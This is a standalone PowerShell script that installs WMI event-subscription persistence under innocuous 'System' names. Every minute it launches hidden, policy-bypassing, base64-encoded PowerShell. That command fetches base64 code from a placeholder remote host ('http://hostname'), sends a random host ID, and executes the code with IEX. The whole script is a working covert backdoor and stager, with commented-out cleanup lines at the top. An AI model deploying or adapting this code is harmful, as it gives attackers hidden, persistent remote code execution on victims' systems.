#gwmi -Namespace root\subscription -Class __TimerInstruction | rwmi
#gwmi -Namespace root\subscription -Class __FilterToConsumerBinding | rwmi
#gwmi -Namespace root\subscription -Class __EventFilter | rwmi
#gwmi -Namespace root\subscription -Class CommandLineEventConsumer | rwmi
$id = [string](Get-Random)
$cmd = "`$i=(New-Object Net.WebClient);`$i.Headers.add('hostid',[string]$id);IEX([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String((`$i.DownloadString('http://hostname/index.html')))))"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$cmd = [Convert]::ToBase64String($bytes)
Set-WmiInstance -Namespace root\subscription -Class __IntervalTimerInstruction -Arguments @{TimerId="SystemTimer"; IntervalBetweenEvents="60000"}
$f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="SystemFilter"; QueryLanguage="WQL"; Query="select * from __TimerEvent within 30 where timerid='SystemTimer'"}
$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="SystemConsumer"; CommandLineTemplate="powershell -w hidden -ep bypass -nop -EncodedCommand $cmd"}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}
